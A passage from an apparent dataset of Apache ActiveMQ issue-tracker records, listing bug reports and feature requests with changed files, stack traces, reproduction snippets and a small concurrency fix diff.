sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:585)at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:122)at org.apache.maven.surefire.Surefire.run(Surefire.java:129)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:585)at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:225)at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:747)Caused by: &openjpa-1.0.0-r420667:568756 nonfatal user error& org.apache.openjpa.persistence.InvalidStateException: This operation cannot be performed while a Transaction is active.FailedObject: org.apache.openjpa.persistence.EntityManagerImpl@1f23ca4at org.apache.openjpa.kernel.AbstractBrokerFactory.assertNoActiveTransaction(AbstractBrokerFactory.java:690)... 30 more
issueID:AMQ-1691
type:Improvement
changed files:
texts:Incude linux 64 bit versions of the java sevice wrapper in the ActiveMQ binary distro
None
issueID:AMQ-1696
type:Bug
changed files:ActiveMQResourceAdapter.java
ActiveMQConnectionSupport.java
texts:Restore the setConnectionFactory() method on the ActiveMQResourceAdapter
AMQ-765
issueID:AMQ-1698
type:Bug
changed files:InactivityMonitor.java
texts:AMQ Threads prevent clean jvm termination
A java process using the AMQ client and connecting to a broker will end up with a couple of threads running called "InactivityMonitor WriteCheck" and "InactivityMonitor ReadCheck".When the main jvm thread finishes and the jvm tries to exit, these two threads have not stopped running and, because they are not daemon threads, the jvm is not able to exit.  The process ends up hanging - mostly shut down but not quite.This is easily reproduced with the most trivial of messaging code (See below) which will not terminate.Changing the creation of these two threads (which arise from the instantiation of Timers really) to make them daemons resolves the problem.Sample Code-------------------public static void main(String [] args){   ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory("","","tcp://localhost:61616");   Connection connection = connectionFactory.createConnection();   connection.start();   // Create the session   Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);   Destination destination = session.createQueue("TEST_QUEUE");   // Create the producer.   MessageProducer producer = session.createProducer(destination);   producer.setDeliveryMode(DeliveryMode.NON_PERSISTENT);   TextMessage message = session.createTextMessage("Hello");   producer.send(message);   producer.close();   session.close();   connection.close();}
issueID:AMQ-1699
type:Bug
changed files:TransportConnector.java
texts:TCPConnector doesn&#39;t listen on socket after stopping then starting it again...
Patch attached.
issueID:AMQ-1701
type:Bug
changed files:DataFile.java
texts:Exception on publishing persistent (disk persistence) message once consumer comes up.
Condition:Message consumer is downMessage producer is publishing messages that ActiveMQ is writing to its store on diskNow, when message consumer comes up, all the previous messages that were backed up on disk start getting deliered to consumer, however, message producer is no longer able to publish message. following exception is thrownCaused by: javax.jms.JMSException: /mmca/activemq-data/journal/data-29 (File exists)at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1181)at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1640)at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:226)
issueID:AMQ-1702
type:Bug
changed files:DefaultDatabaseLocker.java
texts:DefaultDatabaseLocker causes Oracle to throw an exception "maximum open cursors exceeded" under heavy load
The API document for the java.sql.Statement class (http://java.sun.com/j2se/1.4.2/docs/api/java/sql/Statement.html#close()) says that statement objects are automatically closed during garbage collection, however, under heavy load (i.e. for an application that is processing multiple messages per second) you will quickly run out of cursors even before garbage collection gets to reclaiming prepared statements. Also any application that deals with huge volume is going to use a connection pool that also pools the statements, which means that the statement you created are referenced by the pool, thus they won"t be garbage collected and closed. Just like the connection.close triggers the connection to be marked as available in the pool, statement.close will trigger the statement to be available in the pool for whoever needs a statement for this connection.As a result of running out of statements, DefaultDatabaseLocker causes Oracle to throw an exception "maximum open cursors exceeded". And the broker looses the DB lock and shuts down.One solution would be to add a finally block onto the DefaultDatabaseLocker.keepAlive() method to close statement explicitly.
issueID:AMQ-1704
type:New Feature
changed files:
texts:"Confirmation on delivery" and "Confirmation on arrive" reporting messages support.
It would be nice if ActiveMQ could support "Confirmation on delivery" and "Confirmation on arrive" report messages such as IBM WebSphereMQ does.For example, the broker could send a report message to the sending application when it puts the message in the target queueor when the application gets it off the queue.
issueID:AMQ-1705
type:Bug
changed files:AbstractRegion.java
texts:Deadlock between VMTransport and QueueThread
After restarting the central broker in a simple network of brokers, which consists of one central  standalone broker and multiple embedded broker, each intercepting one jms consumer, all producers run into a deadlock."VMTransport" daemon prio=3 tid=0x093bd000 nid=0x901 waiting for monitor entry &#91;0xa30d5000..0xa30d5af0&#93;   java.lang.Thread.State: BLOCKED (on object monitor)        at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:450) waiting to lock <0xdb314578> (a java.lang.Object)        at org.apache.activemq.broker.region.Queue.addSubscription(Queue.java:210)        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:265) locked <0xaf37ca60> (a java.lang.Object) locked <0xdb0c36f0> (a java.lang.Object)        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:380)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:92)        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:529)"QueueThread:queue://de.gameduell.service.user.UserCache.MessageQueue" daemon prio=3 tid=0x086b8000 nid=0x25 waiting for monitor entry [0xa2fdf000..0xa2fdf8f0]   java.lang.Thread.State: BLOCKED (on object monitor)        at org.apache.activemq.broker.region.AbstractRegion.lookup(AbstractRegion.java:367) waiting to lock <0xaf37ca60> (a java.lang.Object)        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:332)        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:125)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:132)        at org.apache.activemq.util.BrokerSupport.resend(BrokerSupport.java:56)        at org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue(RegionBroker.java:712)        at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:257)        at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:257)        at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:257)        at org.apache.activemq.broker.MutableBrokerFilter.sendToDeadLetterQueue(MutableBrokerFilter.java:270)        at org.apache.activemq.broker.region.RegionBroker.messageExpired(RegionBroker.java:679)        at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:491) locked <0xdb314578> (a java.lang.Object)        at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:144)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:929) locked <0xaf905fc8> (a org.apache.activemq.broker.region.Queue$2)        at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84)        at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41)the full jstack output and bot broker configs are attached.activemq.xml is the config of the central broker.activemq-embedded.xml is the config of the embbed one.
issueID:AMQ-1706
type:Bug
changed files:ActiveMQConnectionFactory.java
ActiveMQConnection.java
texts:out of date javadoc for org.apache.activemq.ActiveMQConnectionFactory.setDispatchAsync @param, default value is true on trunk
Default value is now true in the code.question, when did this change? I would be good to reference the change version in the doco created around this feature in 4.2.
issueID:AMQ-1707
type:Improvement
changed files:AmqBrowseCommand.java
pom.xml
StartCommand.java
BrowseCommand.java
ConsoleCommandHandler.java
CommandContext.java
OutputFormatter.java
AbstractCommand.java
ShutdownCommand.java
ShellCommand.java
AbstractAmqCommand.java
AbstractJmxCommand.java
Command.java
QueryCommand.java
MapTransformFilter.java
PurgeCommand.java
ListCommand.java
GlobalWriter.java
texts:Make activemq-console jar a osgi bundle so it can be re-used from servicemix 4
None
issueID:AMQ-1709
type:Bug
changed files:BrokerService.java
texts:Network of Brokers Memory Leak Due to Race Condition
When you a a network of brokers configuration with at least 3 brokers, such as:<broker brokerName="A" persistent="false" ......<transportConnector name="AListener" uri="tcp://localhost:61610"/>...<networkConnector name="BConnector" uri="static:(tcp://localhost:61620)"/><networkConnector name="CConnector" uri="static:(tcp://localhost:61630)"/>with the other brokers have a similar configuration.Then, if you have subscribers trying to connect to all of the brokers you can have a race condition at start up where the transports accept connections from subscribers before the network connectors are initialized.  In BrokerService.startAllConnectors(), the transports are started first.  Then the NetworkConnectors.  As part of starting the network connectors, their constructors takes a collection obtained by calling getBroker().getDurableDestinations().  Normally this list would be empty.  However, if clients connect before this is called, a list is returned for each topic subscribed to.  Then, instead of creating standard TopicSubscriptions for the network connector, DurableTopicSubscriptions are created.  I"m not sure if this really should be a problem, but it is because SimpleDispatchPolicy, in the process of iterating through the DurableTopicSubscriptions, causes messages to be queued up for prefetch without clearing all of the references (for each pass through it looks like three references are registered and only two are cleared.  This becomes a memory leak.  In the logs you see a message saying the PrefetchLimit was reached and then you start seeing logs about memory usage increasing until it gets to 100% and then everything stops.  To reproduce this, create a network of brokers configuration of at least 3 brokers &#8211; the more you have the more likely you are to hit this without a lot of tries so I suggest a bunch.  Start all brokers.  Establish a publisher on broker A using failover://(tcp://localhost:61610) then establish a bunch of subscribers on all the brokers using a similar configuration, i.e, failover://(tcp://localhost:61610), failover://(tcp://localhost:61620).  The more you have on broker "A" the better since you are trying to reproduce the race condition.  You want the others up so that the other brokers expect messages to be passed to them.    Once everybody is up and happy, kill broker A and restart it.  If you do that enough times, you will hit the race condition and the memory leak will start.    You can also put a break point in BrokerService.startAllConnectors() after the transports are started but before the network connectors are started.  That"ll give clients to connect to the transport threads before you tell the VM to continue.I found it an easy fix to store the durable destination list in a local variable before starting the transports and passing that to the network connectors instead of separate calls..  I"m not sure if there are "normal" ways for that list to be anything other than empty.  If not, you could just pass an empty set to the network connectors, but suspect there are legitimate configurations that may need this to requested.  If so, this memory leak would likely occur in these cases, too.   I ran into this in 4.1.2.  I haven"t tested 5.0 since our attempts to switch to 5.0 were met with failure due to the number of bugs in 5.0 (already reported by others).  Looking at 5.0.0 source, the race condition is still there in BrokerService.startAllConnectors() so I suspect the memory leak is there as well.
issueID:AMQ-1712
type:Bug
changed files:AbstractRegion.java
texts:Recovery of TransactionBroker fails because of missing Subscriptions
I am testing recovery of ActiveMQ by having a client continuously putting messages to a queue and then stopping the broker (Ctrl-C) and restarting it. During startup I get the following stack trace on ActiveMQ trunk version:ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.io.IOException: Recovery Failed: The subscription does not exist: ID:FE-Z2965-2798-1210158536046-1:0:-1:2java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.io.IOException: Recovery Failed: The subscription does not exist: ID:FE-Z2965-2798-1210158536046-1:0:-1:2        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.activemq.console.Main.runTaskClass(Main.java:222)        at org.apache.activemq.console.Main.main(Main.java:106)Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.io.IOException: Recovery Failed: The subscription does not exist: ID:FE-Z2965-2798-1210158536046-1:0:-1:2        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1260)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:438)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:383)        at java.security.AccessController.doPrivileged(Native Method)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:353)        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:245)        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:169)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:242)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:400)        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:736)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:369)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:111)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:73)        ... 10 moreCaused by: java.io.IOException: Recovery Failed: The subscription does not exist: ID:FE-Z2965-2798-1210158536046-1:0:-1:2        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27)        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:110)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:153)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:153)        at org.apache.activemq.broker.MutableBrokerFilter.start(MutableBrokerFilter.java:160)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:444)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:50)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1288)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1257)        ... 29 moreCaused by: java.lang.IllegalArgumentException: The subscription does not exist: ID:FE-Z2965-2798-1210158536046-1:0:-1:2        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:357)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.TransactionBroker$1.recover(TransactionBroker.java:100)        at org.apache.activemq.store.amq.AMQTransactionStore.recover(AMQTransactionStore.java:196)        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:92)        ... 36 moreI am wondering whether the AbstractRegion.acknowledge() method shouldn"t consider the ConsumerBrokerExchange.getConnectionContext().getInRecoveryMode() flag and then NOT throw an IllegalArgumentException if no matching Subscription is available (while recovering during startup of the TransactionBroker there won"t be any Subscriptions available anyway, right?) ...Any thoughts?Kai
issueID:AMQ-1714
type:Bug
changed files:
texts:messages get dispatched to a removed consumer, locked and remain unavailable - appear as missing
with failover transport. multiple non persistent producers and consumers on a single queue  and transport disconnects, it is possible for a messages to get dispatched to a removed subscription or consumer. These messages are locked and hence cannot get dispatched to new consumers when the network ins reconnected. From a consumer perspective it looks like there are missing messages.The problem occurs is messages are being dispatched while subscription removal occurring. The list of consumers is modified, inflight messages are removed from the subscription, unlocked and re dispatched. However, dispatch of messages is not synchronised with this removal and it is possible to dispatch to a removed consumer. Any such messages will be locked and never re dispatched.
issueID:AMQ-1717
type:Bug
changed files:Topic.java
Queue.java
texts:sendFailIfNoSpace only works for MemoryUsage, not disk usage
We have a use case where we do not want to wait for ActiveMQ if allocated disk space is used up.   So, we set sendFailIfNoSpace to true in the SystemUsage object.Expected: Setting sendFailIfNoSpace should cause an immediate exception when attempting to send a message if StoreUsage is at or above the max allowed.Actual: ActiveMQ blocks until disk space is available.Some analysis of the code shows that org.apache.activemq.broker.region.Queue"s send method only throws an exception if MemoryUsage is full:        if (isProducerFlowControl() && context.isProducerFlowControl() && memoryUsage.isFull()) {            if (systemUsage.isSendFailIfNoSpace()) {                throw new javax.jms.ResourceAllocationException("SystemUsage memory limit reached");            }}We worked around the problem with our embedded broker set-up by explicitly calling StoreUsage.isFull() before sending messages.
issueID:AMQ-1719
type:Bug
changed files:ConnectionStateTracker.java
texts:Resource adapter stops consuming messages after broker is forcefully stopped/restarted during XA transaction.
Have attached logs from websphere, activeMQ and also the content of the datadirectory for details of data state ( plus the smal program used to create the scenario).#1. Installed the resource adapter that came with ActiveMQ into the websperhe applicationserver and configured it to connect to external broker using failover.#2. Setup a JDBC XA datasource ( Oracle ) and JMS XA destination ( ActiveMQ ).#3. Created a small Message Driven bean that receives a JMS message that it tries to store in the database after which it sleeps for 5 secs. And deployed it to the WebSphere appserver.#4. Started the activemq broker without doing any modifications since the download and extract into the filesystem.#5. Started applicationserver. #6. Started publishing messages to the broker#7. As expected the Message driven bean received the messages one-by-one and processed them.#8. Used to ctrl-C on the broker to halt it in the middle of the processing. Resulting in a failed commit of XA transaction.#9. Waited a while and then started broker again.#10. Received Exception on client side and nothing more happened. Exception in thread "ActiveMQ Transport: tcp://localhost/127.0.0.1:61616" java.lang.NullPointerException    at org.apache.activemq.state.ConnectionStateTracker$RemoveTransactionAction.run(ConnectionStateTracker.java:84)    at org.apache.activemq.state.Tracked.onResponses(Tracked.java:31)    at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:148)    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)    at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)    at java.lang.Thread.run(Thread.java:801)
issueID:AMQ-1720
type:Bug
changed files:Main.java
StartCommand.java
BrokerService.java
JDBCPersistenceAdapter.java
BrokerFactoryBean.java
texts:Default Broker config does not shutdown when an internal persistence error occurs.
This is due to all the other non-deamon threads running that are not part of the broker but in the default config.  For example jetty threads and camel stuff.We should allow the broker server to callback to a listener to that the Main that starts it all can System.exit properly when the broker is shutdown.. that should cause the non-daemon stuff to exit too.
issueID:AMQ-1724
type:New Feature
changed files:
texts:Allow ssl context configuration through spring/xbean
amq ssl works with the javax.net.ssl system properties and can be configured via SslBroker without the system properties as shown in AMQ-1665. It would be better if it was possible to configure via spring or xbean.
issueID:AMQ-1727
type:Bug
changed files:AMQPersistenceAdapter.java
texts:java.lang.IllegalStateException: Timer already cancelled caused by Exception in thread "ActiveMQ Scheduler" java.util.ConcurrentModificationException and
stack trace causes timer thread to abort:Exception in thread "ActiveMQ Scheduler" java.util.ConcurrentModificationExceptionat java.util.HashMap$HashIterator.nextEntry(HashMap.java:841)at java.util.HashMap$KeyIterator.next(HashMap.java:877)at java.util.AbstractSet.removeAll(AbstractSet.java:143)at org.apache.activemq.kaha.impl.async.AsyncDataManager.consolidateDataFilesNotIn(AsyncDataManager.java:404)at org.apache.activemq.store.amq.AMQPersistenceAdapter.cleanup(AMQPersistenceAdapter.java:415)at org.apache.activemq.store.amq.AMQPersistenceAdapter$3.run(AMQPersistenceAdapter.java:267)at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)at java.util.TimerThread.mainLoop(Timer.java:512)at java.util.TimerThread.run(Timer.java:462)subsequent timer enqueue fails with:java.lang.IllegalStateException: Timer already cancelled.at java.util.Timer.sched(Timer.java:354)at java.util.Timer.scheduleAtFixedRate(Timer.java:296)at org.apache.activemq.thread.Scheduler.executePeriodically(Scheduler.java:38)at org.apache.activemq.kaha.impl.async.AsyncDataManager.start(AsyncDataManager.java:190)at org.apache.activemq.store.amq.AMQPersistenceAdapter.start(AMQPersistenceAdapter.java:207)at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1597)at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1550)at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:560)at org.apache.activemq.broker.BrokerService.start(BrokerService.java:455)Problem identified in this diff, the inUse set needs to be copied as it may be modified in parallel to the cleanup.Index: activemq-core/src/main/java/org/apache/activemq/store/amq/AMQPersistenceAdapter.java===================================================================&#8212; activemq-core/src/main/java/org/apache/activemq/store/amq/AMQPersistenceAdapter.java        (revision 655936)+++ activemq-core/src/main/java/org/apache/activemq/store/amq/AMQPersistenceAdapter.java        (working copy)@@ -411,7 +411,7 @@             }             Integer lastDataFile = asyncDataManager.getCurrentDataFileId();             inProgress.add(lastDataFile); Set<Integer> inUse = referenceStoreAdapter.getReferenceFileIdsInUse();+            Set<Integer> inUse = new HashSet<Integer>(referenceStoreAdapter.getReferenceFileIdsInUse());             asyncDataManager.consolidateDataFilesNotIn(inUse, inProgress);         } catch (IOException e) {             LOG.error("Could not cleanup data files: " + e, e);
issueID:AMQ-1728
type:Bug
changed files:
texts:The bin/linux-*/activemq script is missing.
None
issueID:AMQ-1730
type:Bug
changed files:
texts:Bad use of Jms field JMSXDeliveryCount. Related to RedeliveryCount and message prefetch
JMSXDeliveryCount  has to be incremented only on transactional delivery failure ( RuntimeException on processing message, ... ).JMSXDeliveryCount  is actualy used in correlation with Message.java field: "redeliveryCounter".But RedeliveryCounter  field is used to be incremented each time the message is preteched or sent to a consumer => It does not mean that message has been processed by business in transaction with a failure. It just has been prefetched by consumer ou subscriber. A "not consumed message" can be give back to the broker when the consumer is closed by user, because it has been prefetched but not really consumed!It does not match the meaning of the JMS field JMSXDeliveryCount  :"If a failure occurs within transactional processing then the JMSXDeliveryCount is incremented".JMSXDeliveryCount  field only has to be incremented on rollback (isn"t it? ). This is why Message.redeliveryCount can not be used. Or the behavour of field Message.redeliveryCount has to be changed.You can either : create a new counter on message incremented only on rollback, or modify classes : PrefetchSubscription.java and Queue.java to remove redeliveryCount increment and increment it only on rollback. PrefetchSubscription.java:                    if (inAckRange) {//                        node.incrementRedeliveryCounter();                        if (ack.getLastMessageId().equals(messageId)) {                            destination = node.getRegionDestination();                            callDispatchMatched = true;                            break;                        }                    } Queue.java:                for (MessageReference ref : sub.remove(context, this)) {                    QueueMessageReference qmr = (QueueMessageReference)ref;//                    qmr.incrementRedeliveryCounter();                    if( qmr.getLockOwner()==sub ) {                        qmr.unlock();//                        if (!qmr.isDropped() && !qmr.isAcked()) {//                         qmr.incrementRedeliveryCounter();//                        }                    }                    list.add(qmr);                }BTW, In this code it seems there is a second bug, in case of  test "qmr.getLockOwner()==sub" is true qmr is incremented a second time ?! Is it right ?The result of this problem is the following: With Spring and DefaultMessageListenerContainer, a message is consumed one by one. This is why a message prefteched many times, on first real consuming has a JMSXDeliveryCount  with high value not reflecting the reality.
issueID:AMQ-1732
type:New Feature
changed files:ActiveMQSession.java
ActiveMQMessageConsumer.java
texts:Add an Individual acknowledge mode for message consumption
Add support for ActiveMQSession.INDIVIDUAL_ACKNOWLEDGE to enable acknowledgement of individual messages - as there isn"t a clean way of acknowledging messages.So when you call message.acknowledge() - it will only ack that message - as opposed to CLIENT_ACKNOWLEDGE with acknowledges all messages received up to that point by the session
issueID:AMQ-1733
type:Improvement
changed files:
texts:Add an option to allow the xbean broker to destroy the spring application context when the broker is stopped
The broker can be stopped because the underlying JDBC store is unavailable for example.
issueID:AMQ-1735
type:Improvement
changed files:ActiveMQSession.java
ActiveMQMessageConsumer.java
ActiveMQConnectionFactory.java
ActiveMQConnection.java
texts:Add an option to allow acks to be sent synchronously from the client
None
issueID:AMQ-1736
type:Improvement
changed files:HashIndex.java
texts:Reduce amount of retained memory for a HashIndex
None
issueID:AMQ-1738
type:Bug
changed files:PrefetchSubscription.java
texts:Messages stuck in a queue don&#39;t get dispatch (happens when consumers close out)
We have a small timing windows when we closed out the consumer were we take messages it had "locked" (so that other consumer don"t get the same message) and unlock them so that they are available for dispatch. During that window after we unlock those messages, we might still be concurrently sending messages to that subscription. The messages that get sent to the sub after we unlock are the messages that get stuck.
issueID:AMQ-1739
type:Bug
changed files:
texts:ActiveMQ 5.1.0 runs out of file descriptors with lots of &#39;CLOSE_WAIT&#39; sockets
We have no idea why or when, but within a few days after start-up, ActiveMQ suddenly runs out of file descriptors (we"ve raised the limit to 10240). According to lsof it has lots of sockets which are in CLOSE_WAIT when that happens. As soon as that happened once, it would re-occur within a few hours. This behavior did not happen with ActiveMQ 5.0.We have five queues, all with only one consumer. All consumption and production is via the Stomp-interface using PHP-clients. Three of those queues get up to 50-100 messages/second in peak moments, while the consumers adjust their own consumption rate to the systems load (normally its maxed to about 50-150/sec). So in high-load moments on the consumers, the queues can grow to a few thousand messages, normally the queues are emptied as soon as a message occurs. Those five consumers stay connected indefinitely.The messages are all quite small (at most 1 KB or so) and come from 5 web servers. For each web page-request (about 2-3M/day) a connection is made to ActiveMQ via Stomp and at least one message is sent to ActiveMQ, for most requests two are sent to the two most active queues. For all request a new connection is made and at most 4 stomp-messages are sent to ActiveMQ (connect, two messages, disconnect), since apache+php does not allow useful reuse of sockets and similar resources.So So the connection-rate is about the same as the highest message rate on any of the queues (so 50-100connects/second).When the high amount of sockets in CLOSE_WAIT occurs, we manually disable the producers and the sockets disappear gradually. After that the amount of sockets stays around 180-190 (mostly opened jars), but seams to re-increase more easily than when ActiveMQ is restarted. I have not checked if anything special happens on the web servers or databases, since their producer and consumer implementation has not changed since 5.0.What I did notice is that the memory-consumption increases heavily prior to running out of descriptors, and the consumption re-increases way to fast compared to before 11:45u:http://achelois.tweakers.net/~acm/tnet/activemq-5.1-memory-consumption.png
issueID:AMQ-1742
type:Bug
changed files:
texts:False positives from ConnectionAudit duplicateChecker when there are gaps in the message sequences received by a consumer
a consumer can miss messages with failover transport as the connection audit suppress duplicates feature is enabled for failover connections.When there are gaps in the message sequence that span the audit window or when message ids are multiples of 64 the BitArrayBin that backs the AuditChecker gets out of sync and can report false positives, rejecting a duplicate message in error.If it is suspected, enable log4j.logger.org.apache.activemq.ActiveMQMessageConsumer=TRACE to see an event when a duplicate is recieved.
issueID:AMQ-1743
type:Bug
changed files:
texts:Xtream is not in the binary release of 5.1
The 5.1.0 distribution does not include the xstream jars, which are needed for the new JSON / XML to Java Map translation that is part of the Stomp transport.
issueID:AMQ-1744
type:New Feature
changed files:
texts:FTP-Support for Blob Messages
With this patch it is now possible to use an FTP-Server as Blob Repository instead of the web based fileserver application.A few Testcases are also available but disabled by default becaus they need a running FTP-Server.
issueID:AMQ-1747
type:Bug
changed files:
texts:Writing to predefined destinations without admin priviledges
Trying to write to predefined destinations without admin privileges raises "cannot create destination" exception. More info could be foundin the folllowinf thread - http://www.nabble.com/Secutiry-and-Predefined-Destinations-tt17370190s2354.html
issueID:AMQ-1748
type:Bug
changed files:FilePendingMessageCursor.java
Queue.java
StoreQueueCursor.java
texts:Deadlock when TempUsage limit reached
If a SystemUsage limit is set on TempUsage, and that limit is reached, that queue enters a state of deadlock where messages need to be removed so new ones can be added, but they can"t be removed because the objects are locked.I have a patch attached to this issue where the synchronization in StoreQueueCursor and FilePendingMessageCursor is reworked to get around this issue.
issueID:AMQ-1749
type:Bug
changed files:
texts:sslContext xbean element does not work for multiple brokers, SslTransportFactory is maintained in static map.
None
issueID:AMQ-1752
type:Improvement
changed files:TcpTransportServer.java
texts:Make having a separate queue for accepting tcp sockets optional
Add new flag - useQueueForAccept default = true to the TcpTransportServer class
issueID:AMQ-1755
type:Improvement
changed files:DestinationViewMBean.java
InactiveDurableSubscriptionView.java
QueueViewMBean.java
PendingMessageCursor.java
QueueView.java
DurableSubscriptionView.java
DestinationView.java
DurableSubscriptionViewMBean.java
